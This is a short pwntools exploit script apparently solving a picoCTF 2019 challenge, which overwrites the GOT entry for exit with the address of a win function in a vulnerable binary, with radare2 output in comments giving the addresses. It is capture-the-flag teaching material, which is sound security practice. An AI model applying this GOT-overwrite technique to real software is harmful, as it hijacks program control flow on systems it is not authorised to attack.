from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']


def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'


if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/got_1_6a9949d39d119bd2973bdc661d78f71d')
  REMOTE = True

# $ r2 ./vuln
# [0x080484b0]> aaaa
# [0x080484b0]> afl~win
# 0x080485c6    3 153          sym.win
# [0x080484b0]> afl~exit
# 0x08048460    1 6            sym.imp.exit
# [0x080484b0]> pdf @ sym.imp.exit
# / (fcn) sym.imp.exit 6
# \           0x08048460      ff251ca00408   jmp dword [reloc.exit]      ; 0x804a01c ; "f\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b"

exit_got = 0x804a01c
win_addr = 0x080485c6

sh.sendlineafter('address\n', str(exit_got))
sh.sendlineafter('value?\n', str(win_addr))

sh.interactive()
